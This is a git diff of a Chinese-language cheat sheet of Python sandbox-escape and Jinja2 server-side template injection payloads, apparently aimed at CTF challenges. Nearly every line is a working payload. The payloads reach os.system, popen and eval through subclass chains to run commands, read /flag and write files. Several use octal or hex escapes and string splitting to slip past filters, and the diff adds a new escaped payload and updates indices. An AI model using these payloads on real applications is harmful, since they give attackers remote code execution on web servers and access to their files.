@@ -151,7 +151,8 @@ system('ls')
 ## **Python2 POC**
 ```python
 #命令执行payload
-[].__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].system('calc')
+# >>> [].__class__.__base__.__subclasses__()[72] ---  <class 'site._Printer'>
+[].__class__.__base__.__subclasses__()[72].__init__.__globals__['os'].system('calc')
 "".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
 "".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
 [].__class__.__base__.__subclasses__()[60].__init__.__globals__['linecache'].__dict__['os'].system('id')
@@ -182,7 +183,7 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 # write 函数，写文件
 ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
 # 执行任意命令
-().__class__.__bases__[0].__subclasses__()[80].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()' )
+().__class__.__bases__[0].__subclasses__()[80].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()')
 # 通过 system 执行任意命令
 ''.__class__.__base__.__subclasses__()[80].__init__.__globals__["sys"].modules["os"].system("whoami")
 # 通过 popen 执行任意命令
@@ -226,9 +227,9 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 ### 绕过点.
 ```python
-{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(64)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("cat /flag").read()')}}
-{{''['__class__']['__mro__'][-1]['__subclasses__']()[65]['__init__']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag')['read']()}}
-{{ ''['__class__']['__base__']['__subclasses__']()[96]['__subclasses__']()[0]['__subclasses__']()[0]('/flag').read() }}
+{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(80)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("cat /flag").read()')}}
+{{''['__class__']['__mro__'][-1]['__subclasses__']()[80]['__init__']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag')['read']()}}
+{{''['__class__']['__base__']['__subclasses__']()[96]['__subclasses__']()[0]['__subclasses__']()[0]('/flag').read() }}
 getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')
 
 ```
@@ -340,6 +341,9 @@ __getattribute__使用实例访问属性时,调用该方法
 {{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[64]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os')["popen"]("ls")["read"]()}}
 
 {%print%0a(lipsum|attr("\137\137\147\154\157\142\141\154\163\137\137"))|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51")%}
+
+#{{''['__class__']['__mro__'][-1]['__subclasses__']()[80]['__init__']['__globals__']['__builtins__']['__import__']('os')['popen']('calc')['read']()}}
+{%print(''['\137\137\143\154\141\163\163\137\137']['\137\137\155\162\157\137\137'][-1]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[80]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\137\137\151\155\160\157\162\164\137\137']("o""s")["\160\157\160\145\156"]("calc")["\162\145\141\144"]())%}
 
 ```
 ### 过滤{{
